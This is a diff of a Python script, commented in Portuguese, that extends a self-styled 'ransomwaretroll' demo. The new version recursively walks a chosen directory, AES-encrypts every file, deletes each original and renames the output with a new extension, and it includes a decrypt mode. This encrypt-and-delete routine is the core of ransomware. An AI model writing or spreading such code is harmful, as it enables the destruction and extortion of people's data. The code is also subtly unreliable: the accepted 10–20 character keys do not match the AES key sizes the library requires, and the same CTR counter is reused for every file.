@@ -1,67 +1,65 @@
 import os
 import pyaes
 
-# Nome do arquivo
-file_name = "teste.txt"
-encrypted_file_name = file_name + ".ransomwaretroll"
+def encrypt_file(file_path, key):
+    """Função para criptografar um único arquivo."""
+    with open(file_path, "rb") as file:
+        file_data = file.read()
 
-def encrypt_file(key):
-    """Função para criptografar o arquivo."""
-    if os.path.exists(file_name):
-        # Abrir o arquivo original
-        with open(file_name, "rb") as file:
-            file_data = file.read()
+    aes = pyaes.AESModeOfOperationCTR(key)
+    crypto_data = aes.encrypt(file_data)
 
-        # Criptografar os dados
-        aes = pyaes.AESModeOfOperationCTR(key)
-        crypto_data = aes.encrypt(file_data)
+    encrypted_file_path = file_path + ".ransomwaretroll"
+    with open(encrypted_file_path, "wb") as encrypted_file:
+        encrypted_file.write(crypto_data)
 
-        # Salvar o arquivo criptografado
-        with open(encrypted_file_name, "wb") as new_file:
-            new_file.write(crypto_data)
+    os.remove(file_path)
+    print(f"Arquivo {file_path} criptografado para {encrypted_file_path}.")
 
-        # Remover o arquivo original
-        os.remove(file_name)
-        print(f"Arquivo {file_name} foi criptografado para {encrypted_file_name}.")
-    else:
-        print(f"O arquivo {file_name} não existe para criptografar.")
+def decrypt_file(file_path, key):
+    """Função para descriptografar um único arquivo."""
+    with open(file_path, "rb") as file:
+        file_data = file.read()
 
-def decrypt_file(key):
-    """Função para descriptografar o arquivo."""
-    if os.path.exists(encrypted_file_name):
-        # Abrir o arquivo criptografado
-        with open(encrypted_file_name, "rb") as file:
-            file_data = file.read()
+    aes = pyaes.AESModeOfOperationCTR(key)
+    decrypt_data = aes.decrypt(file_data)
 
-        # Descriptografar os dados
-        aes = pyaes.AESModeOfOperationCTR(key)
-        decrypt_data = aes.decrypt(file_data)
+    original_file_path = file_path.replace(".ransomwaretroll", "")
+    with open(original_file_path, "wb") as decrypted_file:
+        decrypted_file.write(decrypt_data)
 
-        # Salvar o arquivo descriptografado
-        with open(file_name, "wb") as new_file:
-            new_file.write(decrypt_data)
+    os.remove(file_path)
+    print(f"Arquivo {file_path} descriptografado para {original_file_path}.")
 
-        # Remover o arquivo criptografado
-        os.remove(encrypted_file_name)
-        print(f"Arquivo {encrypted_file_name} foi descriptografado para {file_name}.")
-    else:
-        print(f"O arquivo {encrypted_file_name} não existe para descriptografar.")
+def process_directory(directory, key, action):
+    """Processa todos os arquivos em um diretório, criptografando ou descriptografando."""
+    for root, dirs, files in os.walk(directory):
+        for file_name in files:
+            file_path = os.path.join(root, file_name)
+            if action == "encrypt" and not file_name.endswith(".ransomwaretroll"):
+                encrypt_file(file_path, key)
+            elif action == "decrypt" and file_name.endswith(".ransomwaretroll"):
+                decrypt_file(file_path, key)
 
 if __name__ == "__main__":
     print("Selecione uma opção:")
-    print("1. Criptografar o arquivo")
-    print("2. Descriptografar o arquivo")
+    print("1. Criptografar todos os arquivos em um diretório")
+    print("2. Descriptografar todos os arquivos em um diretório")
     choice = input("Escolha (1/2): ")
 
-    # Entrada da chave de criptografia
+    # Solicita o caminho do diretório e a chave de criptografia
+    directory = input("Insira o caminho do diretório: ").strip()
     user_key = input("Insira a chave de criptografia/descriptografia (entre 10 e 20 caracteres): ").encode()
 
+    # Validação da chave
     if not (10 <= len(user_key) <= 20):
         print("Erro: A chave deve ter entre 10 e 20 caracteres.")
     else:
         if choice == "1":
-            encrypt_file(user_key)
+            print(f"Criptografando arquivos no diretório {directory}...")
+            process_directory(directory, user_key, "encrypt")
         elif choice == "2":
-            decrypt_file(user_key)
+            print(f"Descriptografando arquivos no diretório {directory}...")
+            process_directory(directory, user_key, "decrypt")
         else:
             print("Opção inválida. Encerrando o script.")
